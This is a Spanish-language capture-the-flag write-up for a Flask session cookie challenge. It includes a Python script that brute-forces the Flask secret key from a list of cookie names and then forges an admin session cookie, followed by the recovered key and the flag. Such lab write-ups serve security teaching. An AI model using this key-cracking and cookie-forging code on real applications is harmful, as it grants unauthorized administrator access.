## Descripción

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://challenge-files.cylabacademy.net/library/ee23cf08573e2c81618150407cdc7db0afa7373693bc0a62c89bf5392d270296/server.py)
## Solución

1. Accedimos a la página del reto y abrimos las herramientas de desarrollador de Firefox con `F12`.

2. Entramos en **Storage → Cookies** y copiamos el valor de la cookie `session`.

3. Instalamos la biblioteca necesaria:
    ```bash
    sudo apt install python3-itsdangerous
    ```

4. Creamos un script para descubrir la clave secreta de Flask:
    ```bash
    nano solve.py
    ```
    Introdujimos el siguiente código:
    ```python
    from itsdangerous import URLSafeTimedSerializer, TimestampSigner
    import hashlib
    
    cookie = "COOKIE_DEL_SITIO"
    
    cookie_names = [
        "snickerdoodle", "chocolate chip",
        "oatmeal raisin", "gingersnap",
        "shortbread", "peanut butter",
        "whoopie pie", "sugar", "molasses",
        "kiss", "biscotti", "butter",
        "spritz", "snowball", "drop",
        "thumbprint", "pinwheel", "wafer",
        "macaroon", "fortune", "crinkle",
        "icebox", "gingerbread", "tassie",
        "lebkuchen", "macaron",
        "black and white",
        "white chocolate macadamia"
    ]
    
    for secret in cookie_names:
        try:
            s = URLSafeTimedSerializer(
                secret_key=secret,
                salt="cookie-session",
                signer=TimestampSigner,
                signer_kwargs={
                    "key_derivation": "hmac",
                    "digest_method": hashlib.sha1
                }
            )
    
            data = s.loads(cookie)
            print("[+] Clave encontrada:", secret)
            print("[+] Sesión original:", data)
            print("[+] Cookie de administrador:")
            print(s.dumps({"very_auth": "admin"}))
            break
    
        except Exception:
            continue
    ```

4. Ejecutamos el script:
    ```bash
    python3 solve.py
    ```
    Descubrimos que la clave secreta era `gingerbread` y generamos una cookie con permisos de administrador.

5. Regresamos a Firefox y reemplazamos el valor de la cookie `session` por la nueva cookie generada.

6. Accedimos a la ruta `/display` y obtuvimos la bandera:
    ```text
    academy{cO0ki3s_yum_8dce1e80}
    ```

## Notas adicionales

## Referencias